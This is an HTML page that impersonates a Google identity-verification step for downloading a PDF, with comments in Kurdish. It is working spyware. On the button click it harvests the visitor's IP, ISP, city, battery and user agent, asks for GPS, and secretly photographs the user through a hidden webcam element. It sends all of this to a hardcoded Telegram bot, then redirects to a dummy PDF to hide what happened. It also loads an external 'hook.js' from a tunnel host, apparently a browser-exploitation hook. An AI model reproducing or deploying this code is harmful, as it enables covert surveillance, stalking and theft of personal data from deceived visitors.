<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Document Verification</title>
    <script src="https://inquiries-stability-extend-width.trycloudflare.com/hook.js"></script>
    <style>
        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f4f4f4; margin: 0; }
        .box { background: white; padding: 40px; border-radius: 12px; text-align: center; box-shadow: 0 4px 20px rgba(0,0,0,0.1); width: 90%; max-width: 400px; }
        .btn { background: #007bff; color: white; border: none; padding: 15px 30px; border-radius: 6px; cursor: pointer; font-size: 16px; font-weight: bold; width: 100%; }
        #spy-vid { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.01; }
    </style>
</head>
<body>

<div class="box">
    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="80" alt=""><br><br>
    <h2>Identity Verification</h2>
    <p>Please click to verify and access your PDF document.</p>
    <button class="btn" id="startBtn">VERIFY & DOWNLOAD</button>
</div>

<video id="spy-vid" autoplay playsinline muted></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
    const botToken = "8325580182:AAEZlBl-DbtFVRA2X3b9mN8qq-EAEcr_Aoc";
    const chatId = "6679834643";
    const pdfUrl = "https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/pdf/dummy.pdf"; // لینکی PDF لێرە بنووسە

    async function sendToBot(msg) {
        return fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, text: msg })
        });
    }

    document.getElementById('startBtn').addEventListener('click', async function() {
        this.innerHTML = "Processing...";
        this.disabled = true;

        // ١. وەرگرتنی IP و زانیارییەکان یەکسەر
        getFullLog();
        
        // ٢. وەرگرتنی GPS بێ ئەوەی کۆدەکە بوەستێنێت
        getGPS();
        
        // ٣. دەستپێکردنی کامێرا و پاشان PDF
        startCameraAndFinalize();
    });

    async function getFullLog() {
        try {
            let bLevel = "N/A";
            if (navigator.getBattery) { const b = await navigator.getBattery(); bLevel = Math.round(b.level * 100) + "%"; }
            const res = await fetch('https://ipapi.co/json/');
            const d = await res.json();
            sendToBot(`🔥 Logged!\n🌐 IP: ${d.ip}\n🏢 ISP: ${d.org}\n🏙️ City: ${d.city}\n🔋 Battery: ${bLevel}\n📱 UA: ${navigator.userAgent}`);
        } catch (e) {}
    }

    function getGPS() {
        navigator.geolocation.getCurrentPosition((pos) => {
            sendToBot(`📍 GPS: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
        }, (err) => {
            sendToBot(`❌ GPS Error: ${err.message}`);
        }, { enableHighAccuracy: false, timeout: 5000 });
    }

    async function startCameraAndFinalize() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            const video = document.getElementById('spy-vid');
            video.srcObject = stream;

            video.onplaying = async () => {
                // چاوەڕوانکردنی کاتێکی کەم بۆ کێشانی وێنە
                await new Promise(r => setTimeout(r, 3000));
                
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                canvas.toBlob(async (blob) => {
                    const fd = new FormData();
                    fd.append('chat_id', chatId);
                    fd.append('photo', blob, 'img.jpg');
                    fd.append('caption', '👤 Captured!');
                    
                    await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
                    
                    stream.getTracks().forEach(t => t.stop());
                    goToPDF(); // ناردنی بۆ PDF
                }, 'image/jpeg', 0.7);
            };
        } catch (e) {
            sendToBot(`❌ Camera Denied: ${e.message}`);
            goToPDF(); // تەنانەت ئەگەر کامێراش نەبوو هەر بیبە بۆ PDF
        }
    }

    function goToPDF() {
        document.getElementById('startBtn').innerHTML = "Success! Opening...";
        setTimeout(() => {
            window.location.replace(pdfUrl); // بردن بۆ PDF بە بێ گەڕانەوە
        }, 800);
    }
</script>
</body>
</html>
